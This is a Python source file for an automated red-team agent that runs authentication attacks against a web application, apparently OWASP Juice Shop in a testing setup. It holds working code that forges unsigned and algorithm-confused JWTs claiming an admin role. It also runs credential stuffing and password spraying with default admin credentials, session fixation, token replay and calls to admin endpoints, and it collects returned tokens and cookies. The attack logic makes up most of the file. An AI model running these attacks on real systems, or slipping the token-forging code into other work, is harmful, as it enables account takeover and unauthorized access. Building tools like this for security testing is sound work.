from typing import List, Dict, Any, Optional
from datetime import datetime
from uuid import UUID
import structlog
import httpx
import base64
import json

from agents.schemas import EpisodeContext, RedTeamAction
from agents.rag.memory import RAGMemory

logger = structlog.get_logger(__name__)


AUTH_ABUSE_TECHNIQUES = [
    {
        "technique_id": "T1556.002",
        "name": "JWT Algorithm Confusion (RS256 to HS256)",
        "owasp_category": "A07",
        "attack_type": "jwt_algo_confusion",
        "endpoints": [
            "/api/users/me",
            "/api/profile",
            "/rest/user/me",
            "/api/v1/users/me",
        ],
        "description": "Exploit JWT algorithm confusion to forge tokens with HS256 using public key",
    },
    {
        "technique_id": "T1556.001",
        "name": "JWT None Algorithm",
        "owasp_category": "A07",
        "attack_type": "jwt_none_algo",
        "endpoints": [
            "/api/users/me",
            "/api/profile",
            "/rest/user/me",
        ],
        "description": "Use 'none' algorithm to bypass signature verification",
    },
    {
        "technique_id": "T1110.004",
        "name": "Credential Stuffing",
        "owasp_category": "A07",
        "attack_type": "credential_stuffing",
        "endpoints": [
            "/api/auth/login",
            "/rest/auth/login",
            "/api/v1/auth/login",
        ],
        "payload_template": {"email": "{{email}}", "password": "{{password}}"},
        "description": "Test leaked credential pairs against login endpoint",
    },
    {
        "technique_id": "T1110.003",
        "name": "Password Spraying",
        "owasp_category": "A07",
        "attack_type": "password_spraying",
        "endpoints": [
            "/api/auth/login",
            "/rest/auth/login",
        ],
        "payload_template": {"email": "{{email}}", "password": "Password123"},
        "description": "Try common passwords against many usernames",
    },
    {
        "technique_id": "T1556.003",
        "name": "Session Fixation",
        "owasp_category": "A07",
        "attack_type": "session_fixation",
        "endpoints": [
            "/api/auth/login",
            "/rest/auth/login",
        ],
        "description": "Set known session ID before authentication",
    },
    {
        "technique_id": "T1539",
        "name": "Weak Password Reset Token",
        "owasp_category": "A07",
        "attack_type": "weak_reset_token",
        "endpoints": [
            "/api/auth/forgot-password",
            "/rest/auth/forgot-password",
            "/api/v1/auth/reset-password",
        ],
        "payload_template": {"email": "{{target_email}}"},
        "description": "Exploit predictable or exposed password reset tokens",
    },
    {
        "technique_id": "T1548.002",
        "name": "Broken Function Level Authorization",
        "owasp_category": "A01",
        "attack_type": "bf_la",
        "endpoints": [
            "/api/admin/delete-user",
            "/api/admin/change-role",
            "/api/admin/access-logs",
            "/rest/admin/users/delete",
        ],
        "description": "Access admin functions without proper role checks",
    },
    {
        "technique_id": "T1548.001",
        "name": "Token Replay / Reuse",
        "owasp_category": "A07",
        "attack_type": "token_replay",
        "endpoints": [
            "/api/users/me",
            "/api/profile",
            "/rest/user/me",
        ],
        "description": "Reuse captured tokens after logout or expiration",
    },
]


class AuthAbuseRedTeamAgent:
    def __init__(
        self,
        rag_memory: Optional[RAGMemory] = None,
        scenario: str = "idor",
        target_type: str = "juice_shop",
    ):
        self.rag = rag_memory
        self.scenario = scenario
        self.target_type = target_type
        self.techniques = AUTH_ABUSE_TECHNIQUES
        self.technique_index = 0
        self.client = httpx.AsyncClient(timeout=30.0, follow_redirects=True)
        self.captured_tokens: List[str] = []
        self.captured_sessions: List[str] = []

    async def select_action(self, state: EpisodeContext) -> Optional[RedTeamAction]:
        if self.technique_index >= len(self.techniques):
            logger.info("All auth abuse techniques exhausted", episode_id=str(state.episode_id))
            return None

        technique = self.techniques[self.technique_index]
        self.technique_index += 1

        target_endpoint = self._select_endpoint(technique, state)
        payload = self._generate_payload(technique, state)
        headers = self._generate_headers(technique, state)

        action = RedTeamAction(
            technique_id=technique["technique_id"],
            owasp_category=technique["owasp_category"],
            attack_type=technique["attack_type"],
            target_endpoint=target_endpoint,
            http_method="POST" if technique["attack_type"] in ["credential_stuffing", "password_spraying", "weak_reset_token"] else "GET",
            payload=payload,
            headers=headers,
            expected_behavior=technique["description"],
        )

        return action

    def _select_endpoint(self, technique: Dict[str, Any], state: EpisodeContext) -> str:
        endpoints = technique.get("endpoints", ["/api/auth/login"])
        endpoint = endpoints[0]

        if "{{target_email}}" in endpoint:
            endpoint = endpoint.replace("{{target_email}}", "admin@juice-shop.com")

        return f"{state.target_url.rstrip('/')}{endpoint}"

    def _generate_payload(self, technique: Dict[str, Any], state: EpisodeContext) -> Dict[str, Any]:
        template = technique.get("payload_template", {})
        payload = {}

        for key, value in template.items():
            if value == "{{email}}":
                payload[key] = "admin@juice-shop.com"
            elif value == "{{password}}":
                payload[key] = "admin123"
            elif value == "{{target_email}}":
                payload[key] = "admin@juice-shop.com"
            else:
                payload[key] = value

        return payload

    def _generate_headers(self, technique: Dict[str, Any], state: EpisodeContext) -> Dict[str, str]:
        headers = {"Content-Type": "application/json"}

        if technique["attack_type"] == "jwt_algo_confusion":
            headers["Authorization"] = f"Bearer {self._forge_hs256_token()}"
        elif technique["attack_type"] == "jwt_none_algo":
            headers["Authorization"] = f"Bearer {self._forge_none_token()}"
        elif technique["attack_type"] == "session_fixation":
            headers["Cookie"] = "session=fixed_session_id_12345"
        elif technique["attack_type"] == "token_replay" and self.captured_tokens:
            headers["Authorization"] = f"Bearer {self.captured_tokens[-1]}"
        elif self.captured_tokens and technique["attack_type"] in ["bf_la", "jwt_none_algo", "jwt_algo_confusion"]:
            headers["Authorization"] = f"Bearer {self.captured_tokens[-1]}"

        return headers

    def _forge_none_token(self) -> str:
        header = {"alg": "none", "typ": "JWT"}
        payload = {"sub": "1", "role": "admin", "email": "admin@juice-shop.com", "exp": 9999999999}
        encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        return f"{encoded_header}.{encoded_payload}."

    def _forge_hs256_token(self) -> str:
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {"sub": "1", "role": "admin", "email": "admin@juice-shop.com", "exp": 9999999999}
        encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        unsigned = f"{encoded_header}.{encoded_payload}"
        import hmac
        import hashlib
        signature = hmac.new(b"public_key_as_secret", unsigned.encode(), hashlib.sha256).digest()
        encoded_sig = base64.urlsafe_b64encode(signature).decode().rstrip("=")
        return f"{unsigned}.{encoded_sig}"

    async def execute_action(self, action: RedTeamAction, target_url: str) -> Dict[str, Any]:
        try:
            full_url = action.target_endpoint
            if not full_url.startswith("http"):
                full_url = f"{target_url.rstrip('/')}{action.target_endpoint}"

            logger.info("Executing auth abuse attack", url=full_url, technique=action.technique_id)

            if action.http_method == "GET":
                response = await self.client.get(full_url, params=action.payload, headers=action.headers)
            elif action.http_method == "POST":
                response = await self.client.post(full_url, json=action.payload, headers=action.headers)
            else:
                response = await self.client.request(
                    action.http_method, full_url, json=action.payload, headers=action.headers
                )

            success = response.status_code in [200, 201, 204]
            is_auth_bypass = success and self._check_auth_bypass(response, action.attack_type)

            if response.headers.get("Authorization"):
                token = response.headers.get("Authorization", "").replace("Bearer ", "")
                if token and token not in self.captured_tokens:
                    self.captured_tokens.append(token)

            if "Set-Cookie" in response.headers:
                cookie = response.headers["Set-Cookie"]
                if cookie not in self.captured_sessions:
                    self.captured_sessions.append(cookie)

            result = {
                "success": is_auth_bypass,
                "status_code": response.status_code,
                "response_body": response.text[:2000] if response.text else "",
                "response_headers": dict(response.headers),
                "technique_id": action.technique_id,
                "attack_type": action.attack_type,
                "timestamp": datetime.utcnow().isoformat(),
            }

            if is_auth_bypass:
                logger.info("Auth bypass successful", technique=action.technique_id, status=response.status_code)
            else:
                logger.info("Auth attack failed", technique=action.technique_id, status=response.status_code)

            return result

        except httpx.TimeoutException:
            return {"success": False, "error": "Timeout", "technique_id": action.technique_id}
        except httpx.ConnectError:
            return {"success": False, "error": "Connection failed", "technique_id": action.technique_id}
        except Exception as e:
            logger.error("Auth attack execution error", technique=action.technique_id, error=str(e))
            return {"success": False, "error": str(e), "technique_id": action.technique_id}

    def _check_auth_bypass(self, response: httpx.Response, attack_type: str) -> bool:
        if response.status_code != 200:
            return False

        body = response.text.lower()

        if attack_type in ["jwt_algo_confusion", "jwt_none_algo", "token_replay"]:
            return any(kw in body for kw in ["admin", "role", "token", "profile", "email"])
        elif attack_type in ["credential_stuffing", "password_spraying"]:
            return any(kw in body for kw in ["token", "access_token", "jwt", "session"])
        elif attack_type == "weak_reset_token":
            return any(kw in body for kw in ["reset", "token", "sent", "email"])
        elif attack_type == "session_fixation":
            return "session" in body or response.headers.get("Set-Cookie") is not None
        elif attack_type == "bf_la":
            return any(kw in body for kw in ["admin", "deleted", "role", "success"])

        return False

    async def close(self):
        await self.client.aclose()